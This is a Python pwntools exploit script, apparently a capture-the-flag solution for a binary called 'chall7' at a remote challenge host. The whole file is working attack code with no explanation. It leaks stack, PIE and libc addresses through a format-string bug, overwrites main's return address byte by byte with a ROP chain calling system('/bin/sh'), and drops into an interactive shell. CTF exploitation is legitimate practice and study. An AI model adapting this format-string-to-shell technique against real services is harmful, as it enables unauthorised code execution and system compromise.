from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')

if sys.argv[1] == 'l':
    s = process('./chall7')
    libc = ELF('./local_libc.so.6')
elif sys.argv[1] == 'd':
    s = gdb.debug('./chall7', 'b *main+236')
    libc = ELF('./local_libc.so.6')
elif sys.argv[1] == 'r':
    s = remote('challenge.pwny.racing', 40007)
    libc = ELF('./libc.so.6')
elf = ELF('./chall7')

def send(buf):
    s.sendlineafter('input: ', buf)
    s.recvuntil('output: ')
    res = s.recvline()
    s.sendlineafter('nope): ', 'yes sir')
    return res

def write(offset,value):
    buf = '%{}c%{}$hhn'.format(value,offset)
    send(buf)

def write_address(stack,address):
    for i in range(6):
        write(12,(stack+0x80+i)&0xff)
        write(20,(address>>(i*8))&0xff)

def write_value(stack,address,value):
    for i in range(6):
        write_address(stack,address+i)
        write(22,(value>>(i*8))&0xff)
    # write_address(stack,address)

# leak stack %11$p
# leak pie %16$p _start
# leak libc %33$p _exit
# prepare rop chain in data, then 'nope'
# overwrite main's return address with rop chain qword by qword

stack = int(send('%11$p').decode().strip(),16)
pie = int(send('%16$p').decode().strip(),16) - elf.symbols['_start']
libc_base = int(send('%33$p').decode().strip(),16) - libc.symbols['_exit']
elf.address = pie
libc.address = libc_base

rop = ROP(libc)
rop.system(libc.search(b'/bin/sh').__next__())
ropped = bytes(rop)
for i in range(3):
    frag = u64(ropped[i*8:(i+1)*8])
    if i == 2:
        frag += 4
    write_value(stack, stack+0x88+i*8, frag)
write(12,(stack+0x80)&0xff)
s.sendline('aaaa')
s.sendline('nope')
s.recvuntil('nope): ')

s.interactive()

